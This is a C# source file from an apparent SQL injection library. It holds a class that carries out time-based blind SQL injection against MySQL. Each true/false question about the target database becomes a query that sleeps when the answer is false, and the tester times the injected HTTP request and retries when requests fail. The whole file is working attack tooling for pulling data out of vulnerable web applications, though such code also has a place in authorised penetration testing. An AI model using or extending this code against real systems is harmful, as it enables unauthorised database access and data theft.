﻿using System;
using System.Linq;
using System.Threading.Tasks;
using Microsoft.Extensions.Logging;
using System.Diagnostics;
using System.Net.Http;
using System.Threading;

namespace PeterJuhasz.SqlInjection
{
    using static MySqlFunctions;

    public class TimeBasedHypothesisTester : IHypothesisTester
    {
        public TimeBasedHypothesisTester(
            SqlWriter writer,
            ITimeBasedInjector injector,
            TimeBasedBlindSqlInjectionOptions options,
            ILogger<TimeBasedHypothesisTester> logger
        )
        {
            Writer = writer;
            Injector = injector;
            Options = options;
            Logger = logger;
        }

        public SqlWriter Writer { get; }
        public ITimeBasedInjector Injector { get; }
        public TimeBasedBlindSqlInjectionOptions Options { get; }
        public ILogger<TimeBasedHypothesisTester> Logger { get; }

        public async Task<bool> TestAsync(IQueryable<bool> query)
        {
            if (query == null)
                throw new ArgumentNullException(nameof(query));

            var test = query.Select(condition => condition ? 1 : Sleep(Options.InjectedWaitTime.TotalSeconds)).Take(1);

            Writer.Clear();
            var visitor = new MySqlQueryModelVisitor(Writer);
            var sql = visitor.Render(test);

            while (true)
            {
                try
                {
                    Stopwatch stopwatch = Stopwatch.StartNew();

                    Logger.LogDebug(sql);
                    await Injector.InjectAsync(sql, CancellationToken.None);

                    stopwatch.Stop();

                    return stopwatch.Elapsed < Options.SuccessfulTime;
                }
                catch (HttpRequestException req) when (req.InnerException?.Message?.Contains("timed out") ?? false)
                {
                    Logger.LogWarning($"Retrying...");
                    continue;
                }
                catch (HttpRequestException req) when (req.InnerException?.Message?.Contains("unrecognized response") ?? false)
                {
                    Logger.LogWarning($"Retrying...");
                    continue;
                }
                catch (OperationCanceledException)
                {
                    Logger.LogWarning($"Retrying...");
                    continue;
                }
            }
        }
    }
}
